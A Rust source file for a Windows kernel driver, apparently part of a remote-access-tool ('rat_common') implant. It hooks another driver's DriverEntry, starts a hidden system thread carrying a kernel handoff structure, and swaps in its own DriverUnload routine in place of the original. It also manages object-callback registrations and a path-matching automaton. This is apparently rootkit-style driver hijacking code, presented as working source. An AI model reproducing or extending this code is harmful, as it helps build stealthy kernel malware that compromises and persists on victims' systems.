use alloc::boxed::Box;
use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr};

use rat_common::windows::kernel::KernelHandoff;
use wdk::{self, nt_success};
use wdk_sys::ntddk::{
    IoDeleteDevice, IoDeleteSymbolicLink, ObUnRegisterCallbacks, PsCreateSystemThread,
    RtlInitUnicodeString,
};
use wdk_sys::{NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS, UNICODE_STRING};
use widestring::Utf16Str;

use crate::global::{
    DOS_NAME, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
};
use crate::{info, threads, warn};

type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
static _ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

fn remove_registered_services(driver: PDRIVER_OBJECT) {
    if let Some(driver) = unsafe { driver.as_ref() }
        && !driver.DeviceObject.is_null()
    {
        let device = driver.DeviceObject;
        info!("Removing device object: {device:p}");

        let mut dos_name = UNICODE_STRING::default();
        unsafe {
            RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
            let status = IoDeleteSymbolicLink(&mut dos_name);
            if !nt_success(status) {
                warn!("IoDeleteSymbolicLink error: 0x{status:X}");
            }

            IoDeleteDevice(device);
        }
    }

    let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
    if !handle.is_null() {
        info!("Unregistering object callbacks");
        unsafe {
            ObUnRegisterCallbacks(handle);
        }
    }

    let ac = OBJ_PATH_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
    if !ac.is_null() {
        info!("Dropping Aho-Corasick automaton");
        unsafe {
            let _ = Box::from_raw(ac);
        }
    }
}

unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
    info!("DriverUnload: driver={driver:p}");
    let old_driver_unload_ptr = _ORIGINAL_DRIVER_UNLOAD.load(Ordering::Acquire);
    if !old_driver_unload_ptr.is_null() {
        unsafe {
            let old_driver_unload =
                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
            old_driver_unload(driver);
        }
    }

    remove_registered_services(driver);
}

pub fn driver_entry_prehook(
    driver: PDRIVER_OBJECT,
    registry_path: Option<&Utf16Str>,
    extra: &KernelHandoff,
) -> anyhow::Result<()> {
    info!("DriverEntry: driver={driver:p}, registry_path={registry_path:?}");
    let mut thread = ptr::null_mut();

    ORIGINAL_DRIVER_OBJECT.store(driver, Ordering::Release);
    let status = unsafe {
        PsCreateSystemThread(
            &mut thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            Some(threads::initialize::initialize_thread_routine),
            Box::into_raw(Box::new(*extra)).cast(),
        )
    };
    anyhow::ensure!(
        nt_success(status),
        "PsCreateSystemThread error (initialize_thread_routine): 0x{status:X}",
    );

    Ok(())
}

pub fn driver_entry_posthook(
    driver: PDRIVER_OBJECT,
    _: Option<&Utf16Str>,
    status: NTSTATUS,
    _: &KernelHandoff,
) -> anyhow::Result<()> {
    info!("Original DriverEntry returned with status: 0x{status:X}");

    if let Some(driver) = unsafe { driver.as_mut() } {
        if let Some(unload) = driver.DriverUnload {
            _ORIGINAL_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
        }

        driver.DriverUnload = Some(driver_unload);
    }

    Ok(())
}
